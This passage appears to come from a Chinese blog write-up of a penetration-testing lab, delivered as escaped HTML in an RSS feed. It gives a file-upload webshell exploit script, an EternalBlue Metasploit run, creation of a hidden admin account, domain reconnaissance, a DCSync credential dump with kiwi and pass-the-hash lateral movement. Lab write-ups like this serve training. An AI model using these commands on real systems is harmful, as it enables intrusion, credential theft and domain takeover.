&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">url1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">url_pre&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;?a=check&amp;amp;m=login&amp;amp;d=&amp;amp;ajaxbool=true&amp;amp;rnd=533953&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">url2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">url_pre&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;/index.php?a=upfile&amp;amp;m=upload&amp;amp;d=public&amp;amp;maxsize=100&amp;amp;ajaxbool=true&amp;amp;rnd=798913&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">url3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">url_pre&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;/task.php?m=qcloudCos|runt&amp;amp;a=run&amp;amp;fileid=11&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">data1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;rempass&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;jmpass&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;false&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;device&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;1625884034525&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;ltype&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;adminuser&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;YWRtaW4=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;adminpass&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;YWRtaW4xMjM=&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;yanzm&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">data1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">files&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;file&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;1.php&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;r+&amp;#39;&lt;/span>&lt;span class="p">)})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">filepath&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="s1">&amp;#39;filepath&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">filepath&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">filepath&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;.uptemp&amp;#39;&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;.php&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">id&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">filepath&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">url3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">url_pre&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;/task.php?m=qcloudCos|runt&amp;amp;a=run&amp;amp;fileid=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="nb">id&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">r&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url_pre&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">filepath&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;?a=system(&amp;#39;dir&amp;#39;);&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">r&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>成功getshell，得到flag2，权限足够，新建一个用户登录上去&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">net user test1 baozongwi123! /add
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net localgroup administrators test1 /add
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>并不是域用户，接着去打永恒之蓝，先在kali弄好socks代理&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo vim /etc/proxychains4.conf
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">socks5 156.238.233.93 &lt;span class="m">5555&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag3">flag3
&lt;/h2>&lt;p>利用msf攻击&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">proxychains4 msfconsole
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">use exploit/windows/smb/ms17_010_eternalblue
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> payload windows/x64/meterpreter/bind_tcp_uuid
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> RHOSTS 172.22.1.21
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">exploit
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chcp &lt;span class="m">65001&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user /domain
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>本来想的是直接新建用户上去的，但是发现一个问题，就是链接之后直接蓝屏了（忘记了）&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/3.png"
width="977"
height="783"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/3_hu_cd8d4ff4c3d199c9.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/3_hu_ea97a6c3c10646cd.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="124"
data-flex-basis="299px"
>&lt;/p>
&lt;p>确认是域用户&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看域管理员&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net group &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看企业管理员 &lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net group &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看域控制器&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net group &lt;span class="s2">&amp;#34;Domain Controllers&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看所有域计算机&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net group &lt;span class="s2">&amp;#34;Domain Computers&amp;#34;&lt;/span> /domain
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看域信息&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nltest /domain_trusts
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看域控制器详细信息&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nslookup DC01.xiaorang.lab
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看当前机器在域中的状态&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nltest /sc_query:xiaorang.lab
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>上传sharphound收集信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">exit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp /home/kali/桌面/Pentest/BloodHound-linux-x64/resources/app/Collectors/SharpHound.exe /tmp/SharpHound.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">upload /tmp/SharpHound.exe C:&lt;span class="se">\\&lt;/span>Windows&lt;span class="se">\\&lt;/span>temp&lt;span class="se">\\&lt;/span>SharpHound.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">shell
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\t&lt;/span>emp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SharpHound.exe -c all
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">exit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">download C:&lt;span class="se">\\&lt;/span>Windows&lt;span class="se">\\&lt;/span>Temp&lt;span class="se">\\&lt;/span>20250617200323_BloodHound.zip /tmp/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 也可以下载到你的工作目录&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">download C:&lt;span class="se">\\&lt;/span>Windows&lt;span class="se">\\&lt;/span>Temp&lt;span class="se">\\&lt;/span>20250617200323_BloodHound.zip /home/kali/桌面/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/4.png"
width="1763"
height="898"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/4_hu_25bcc691097e9a6a.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/4_hu_b8db572b11160f1e.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="196"
data-flex-basis="471px"
>&lt;/p>
&lt;p>查看当前用户与域的关系&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/5.png"
width="828"
height="668"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/5_hu_1b9f422234f9294e.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/5_hu_8737eb6ceecdc61.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="123"
data-flex-basis="297px"
>&lt;/p>
&lt;blockquote>
&lt;p>The computer XIAORANG-WIN7.XIAORANG.LAB has the DS-Replication-Get-Changes-All permission on the domain XIAORANG.LAB.&lt;/p>
&lt;p>计算机 XIAORANG-WIN7.XIAORANG.LAB 对域 XIAORANG.LAB 具有 DS-Replication-Get-Changes-All 权限。&lt;/p>
&lt;p>Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes, a principal may perform a DCSync attack.&lt;/p>
&lt;p>单独而言，此边缘不授予执行攻击的能力。但是，与 DS-Replication-Get-Changes 结合使用时，委托人可以执行 DCSync 攻击。&lt;/p>
&lt;p>The computer XIAORANG-WIN7.XIAORANG.LAB has the DS-Replication-Get-Changes permission on the domain XIAORANG.LAB.&lt;/p>
&lt;p>计算机 XIAORANG-WIN7.XIAORANG.LAB 对域 XIAORANG.LAB 具有 DS-Replication-Get-Changes 权限。&lt;/p>
&lt;p>Individually, this edge does not grant the ability to perform an attack. However, in conjunction with DS-Replication-Get-Changes-All, a principal may perform a DCSync attack.&lt;/p>
&lt;p>单独而言，此边缘不授予执行攻击的能力。但是，与 DS-Replication-Get-Changes-All 结合使用时，委托人可以执行 DCSync 攻击。&lt;/p>&lt;/blockquote>
&lt;p>所以可以利用这个用户进行 DCSync攻击，现在需要获得&lt;code>NThash&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/PixPin_2025-08-09_22-28-25.png"
width="732"
height="454"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/PixPin_2025-08-09_22-28-25_hu_fd8d1073cbbd6c73.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/PixPin_2025-08-09_22-28-25_hu_e65e6015eec80f0a.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="161"
data-flex-basis="386px"
>&lt;/p>
&lt;blockquote>
&lt;p>When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user&amp;rsquo;s process.
当用户向计算机进行身份验证时，他们通常会在系统上公开凭据，这些凭据可以通过 LSASS 注入、令牌作/盗窃或注入用户进程来检索。&lt;/p>&lt;/blockquote>
&lt;p>所以可以利用猕猴桃获得管理员的&lt;code>NThash&lt;/code>，但是我们不用传猕猴桃，因为有msf会话，可以直接使用其中的模块&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">load kiwi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kiwi_cmd &lt;span class="s2">&amp;#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&amp;#34;&lt;/span> &lt;span class="nb">exit&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">exit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/6.png"
width="855"
height="559"
srcset="https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/6_hu_5d02482e89675992.png 480w, https://baozongwi.xyz/p/chunqiu-cloud-mirror-initial/6_hu_29198c9ab9abbe37.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="152"
data-flex-basis="367px"
>&lt;/p>
&lt;p>再直接横向即可&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">proxychains4 impacket-wmiexec xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8 -codec gbk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">type&lt;/span> Users&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\f&lt;/span>lag&lt;span class="se">\f&lt;/span>lag03.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item></channel></rss>